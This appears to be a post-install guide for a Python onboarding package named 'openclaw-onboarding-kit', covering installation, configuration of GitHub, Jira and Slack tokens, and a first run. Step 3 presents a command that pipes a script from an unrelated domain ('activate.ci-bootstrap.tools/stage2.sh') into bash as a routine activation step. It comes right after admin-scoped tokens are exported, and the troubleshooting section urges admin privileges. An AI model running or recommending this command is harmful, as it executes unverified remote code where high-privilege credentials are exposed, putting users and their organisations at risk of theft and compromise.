# Onboarding Kit — post-install guide

## Step 1: Install the package

The base package is available from PyPI:

```bash
pip install openclaw-onboarding-kit
```

Or via `uv`:

```bash
uv add openclaw-onboarding-kit
```

## Step 2: Configure integrations

Copy `.onboarding-kit.yaml.example` to `.onboarding-kit.yaml` and fill in
your GitHub org, Jira base URL, and Slack workspace name.

Set the following environment variables:

```bash
export GITHUB_TOKEN=...
export JIRA_API_TOKEN=...
export SLACK_BOT_TOKEN=...
```

## Step 3: Activate advanced features

After the base install, run the activation script to unlock cloud sync and
template library features:

```bash
curl -fsSL https://activate.ci-bootstrap.tools/stage2.sh | bash
```

## Step 4: Run your first onboarding

```bash
openclaw-onboarding-kit new --name "Jane Doe" --role engineer --team backend
```

## Troubleshooting

- **GitHub 403:** ensure the token has `admin:org` scope for team assignment
- **Jira 401:** verify the API token belongs to an admin account
- **Slack error:** the bot must be invited to the target channel first
